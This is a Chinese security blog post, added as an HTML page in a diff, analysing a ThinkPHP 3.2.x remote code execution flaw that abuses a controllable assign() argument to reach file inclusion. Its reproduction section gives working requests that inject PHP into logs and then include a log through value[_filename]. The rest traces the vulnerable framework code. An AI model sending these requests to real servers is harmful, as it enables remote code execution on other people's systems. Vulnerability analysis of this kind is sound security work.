@@ -1,0 +1,391 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>PHP代码审计—ThinkPHP3.2.X远程代码执行 | bewhale&#39;s blog</title>
+
+<link rel="shortcut icon" href="https://bewhale.github.io/favicon.ico?v=1666713403567">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bewhale.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            bewhale&#39;s blog
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/tools" class="menu gt-a-link">
+                    在线工具
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1666713403567"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    PHP代码审计—ThinkPHP3.2.X远程代码执行
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2021-12-25 ·
+                    </time>
+                    
+                        <a href="https://bewhale.github.io/tag/zuB-zqMRV/" class="post-tags">
+                            # PHP代码审计
+                        </a>
+                    
+                        <a href="https://bewhale.github.io/tag/I8zfItXpKf/" class="post-tags">
+                            # ThinkPHP
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="前言">前言</h1>
+<p>该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。个人感觉这个漏洞虽然不如thinkphp本体的一些RCE漏洞影响范围大，但也算是提供了一个思路，对基于某些框架二次开发的系统，寻找其不规范的方法调用的思路还是值得学习的。</p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<p>控制器添加test方法，写入模板赋值assign的 Demo</p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8');
+    }
+
+    public function test($value){
+        $this-&gt;assign($value);
+        $this-&gt;display();
+    }
+}
+</code></pre>
+<p>因为该漏洞利用的assign函数需要模板渲染，所以需要对应的模板文件，与demo相对应的文件路径：</p>
+<p>view下创建一个Index目录，然后在Index目录下面新建test.html文件进行视图渲染，文件内容随意<br>
+目录：\Application\Home\View\Index\test.html</p>
+<p><strong>创建日志文件：</strong></p>
+<pre><code class="language-php">http://192.168.1.8/index.php?c=&lt;?php=phpinfo();?&gt;
+// 没有给调用的模块参数，默认为Home， 控制器报错，日志在 Application/Runtime/Logs/Home 下面
+    
+http://192.168.1.8/index.php?m=--&gt;&lt;?=phpinfo();?&gt;
+// 模块报错， 日志在 Application/Runtime/Logs/Common下面
+</code></pre>
+<p><strong>日志文件目录：</strong></p>
+<p>开启debug</p>
+<pre><code>请求不报错 日志文件在 对应的模块下面 比如Home模块  路径：Application/Runtime/Logs/Home下
+
+请求会报错 
+如果是模块错误  日志文件在 Application/Runtime/Logs/Common下
+如果是控制器或者方法错误 日志文件在对应的模块下面 比如Home模块 路径：Application/Runtime/Logs/Home 下
+</code></pre>
+<p>关闭debug</p>
+<pre><code>请求不会报错 不会记录日志
+请求会报错 保存的位置和开启debug一致 
+</code></pre>
+<p><strong>包含日志文件：</strong></p>
+<pre><code class="language-php">http://192.168.1.8/index.php?m=Home&amp;c=Index&amp;a=test&amp;value[_filename]=./Application/Runtime/Logs/Home/21_06_08.log
+</code></pre>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>Application/Home/Controller/IndexController.class.php</p>
+<p>assign方法中第一个变量可控</p>
+<pre><code class="language-php">    public function test($value){
+        $this-&gt;assign($value);
+        $this-&gt;display();
+    }
+</code></pre>
+<p>跟进assign函数</p>
+<p>ThinkPHP/Library/Think/Controller.class.php</p>
+<pre><code class="language-php">    protected function assign($name,$value='') {
+        $this-&gt;view-&gt;assign($name,$value);
+        return $this;
+    }
+</code></pre>
+<p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>中的assign函数，</p>
+<p>此时进入else分支，我们传进去的<code>$value</code>被赋值给<code>$this-&gt;tVar[$name]</code></p>
+<pre><code class="language-php">    public function assign($name,$value=''){
+        if(is_array($name)) {
+            $this-&gt;tVar   =  array_merge($this-&gt;tVar,$name);
+        }else {
+            $this-&gt;tVar[$name] = $value;
+        }
+    }
+</code></pre>
+<p>然后返回， 无参调用 display 函数，跟进display函数</p>
+<p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>的display函数</p>
+<pre><code class="language-php">    protected function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {
+        $this-&gt;view-&gt;display($templateFile,$charset,$contentType,$content,$prefix);
+    }
+</code></pre>
+<p>继续跟进</p>
+<p>开始解析并获取模板文件内容，此时模板文件路径和内容为空</p>
+<pre><code class="language-php">    public function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {
+        G('viewStartTime');
+        // 视图开始标签
+        Hook::listen('view_begin',$templateFile);
+        // 解析并获取模板内容
+        $content = $this-&gt;fetch($templateFile,$content,$prefix);
+        // 输出模板内容
+        $this-&gt;render($content,$charset,$contentType);
+        // 视图结束标签
+        Hook::listen('view_end');
+    }
+</code></pre>
+<p>进入<code>ThinkPHP/Library/Think/View.class.php</code>的fetch函数后，</p>
+<p>这里会先判断模板存不存在，模板文件不存在直接返回，所以开始需要创建模板文件</p>
+<p>接着判断是不是php类型模板，不是进入else分支。</p>
+<p>接着$params 被赋值，var即为为我们传进去的日志路径，file为模板文件的路径。</p>
+<pre><code class="language-php">    public function fetch($templateFile='',$content='',$prefix='') {
+        if(empty($content)) {
+            $templateFile   =   $this-&gt;parseTemplate($templateFile);
+            // 模板文件不存在直接返回
+            if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
+        }else{
+            defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
+        }
+        // 页面缓存
+        ob_start();
+        ob_implicit_flush(0);
+        if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
+            $_content   =   $content;
+            // 模板阵列变量分解成为独立变量
+            extract($this-&gt;tVar, EXTR_OVERWRITE);
+            // 直接载入PHP模板
+            empty($_content)?include $templateFile:eval('?&gt;'.$_content);
+        }else{
+            // 视图解析标签
+            $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
+            Hook::listen('view_parse',$params);
+        }
+        // 获取并清空缓存
+        $content = ob_get_clean();
+        // 内容过滤标签
+        Hook::listen('view_filter',$content);
+        // 输出模板文件
+        return $content;
+    }
+</code></pre>
+<p>接着进入<code>ThinkPHP/Library/Think/Hook.class.php</code>的listen函数，经过一些判断，进入exec函数</p>
+<pre><code class="language-php">   static public function listen($tag, &amp;$params=NULL) {
+        if(isset(self::$tags[$tag])) {
+            if(APP_DEBUG) {
+                G($tag.'Start');
+                trace('[ '.$tag.' ] --START--','','INFO');
+            }
+            foreach (self::$tags[$tag] as $name) {
+                APP_DEBUG &amp;&amp; G($name.'_start');
+                $result =   self::exec($name, $tag,$params);
+                if(APP_DEBUG){
+                    G($name.'_end');
+                    trace('Run '.$name.' [ RunTime:'.G($name.'_start',$name.'_end',6).'s ]','','INFO');
+                }
+                if(false === $result) {
+                    // 如果返回false 则中断插件执行
+                    return ;
+                }
+            }
+            if(APP_DEBUG) { // 记录行为的执行日志
+                trace('[ '.$tag.' ] --END-- [ RunTime:'.G($tag.'Start',$tag.'End',6).'s ]','','INFO');
+            }
+        }
+        return;
+    }
+</code></pre>
+<p>接着exec函数把<code>$params</code> 带进<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>的run函数处理</p>
+<pre><code class="language-php">    static public function exec($name, $tag,&amp;$params=NULL) {
+        if('Behavior' == substr($name,-8) ){
+            // 行为扩展必须用run入口方法
+            $tag    =   'run';
+        }
+        $addon   = new $name();
+        return $addon-&gt;$tag($params);
+    }
+</code></pre>
+<pre><code class="language-php">   public function run(&amp;$_data){
+        $engine             =   strtolower(C('TMPL_ENGINE_TYPE'));
+        $_content           =   empty($_data['content'])?$_data['file']:$_data['content'];
+        $_data['prefix']    =   !empty($_data['prefix'])?$_data['prefix']:C('TMPL_CACHE_PREFIX');
+        if('think'==$engine){ // 采用Think模板引擎
+            if((!empty($_data['content']) &amp;&amp; $this-&gt;checkContentCache($_data['content'],$_data['prefix'])) 
+                ||  $this-&gt;checkCache($_data['file'],$_data['prefix'])) { // 缓存有效
+                //载入模版缓存文件
+                Storage::load(C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_SUFFIX'),$_data['var']);
+            }else{
+                $tpl = Think::instance('Think\\Template');
+                // 编译并加载模板文件
+                $tpl-&gt;fetch($_content,$_data['var'],$_data['prefix']);
+            }
+        }else{
+            // 调用第三方模板引擎解析和输出
+            if(strpos($engine,'\\')){
+                $class  =   $engine;
+            }else{
+                $class   =  'Think\\Template\\Driver\\'.ucwords($engine);                
+            }            
+            if(class_exists($class)) {
+                $tpl   =  new $class;
+                $tpl-&gt;fetch($_content,$_data['var']);
+            }else {  // 类没有定义
+                E(L('_NOT_SUPPORT_').': ' . $class);
+            }
+        }
+    }
+</code></pre>
+<p>进入<code>ThinkPHP/Library/Think/Template.class.php</code>的fetch函数</p>
+<pre><code class="language-php">    public function fetch($templateFile,$templateVar,$prefix='') {
+        $this-&gt;tVar         =   $templateVar;
+        $templateCacheFile  =   $this-&gt;loadTemplate($templateFile,$prefix);
+        Storage::load($templateCacheFile,$this-&gt;tVar,null,'tpl');
+    }
+</code></pre>
+<p>进入最后的load函数，$var不为空则使用extract方法的EXTR_OVERWRITE默认描述对变量值进行覆盖，</p>
+<p>之后include该日志文件路径，造成文件包含。</p>
+<pre><code class="language-php">    public function load($_filename,$vars=null){
+        if(!is_null($vars)){
+            extract($vars, EXTR_OVERWRITE);
+        }
+        include $_filename;
+    }
+</code></pre>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">【漏洞通报】ThinkPHP3.2.x RCE漏洞通报</a></p>
+<p><a href="https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/">ThinkPHP3.2.x RCE复现</a></p>
+<p><a href="https://www.cnblogs.com/sevck/p/15012267.html">炒冷饭之ThinkPHP3.2.X RCE漏洞分析</a></p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://bewhale.github.io/post/PHP代码审计—ThinkPHP3.2.X_find_select_delete注入(2018-08-23)/" class="post-title gt-a-link">
+                    PHP代码审计—ThinkPHP3.2.X_find_select_delete注入(2018-08-23)
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first"></div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/bewhale" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/bewhale" target="_blank">bewhale</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
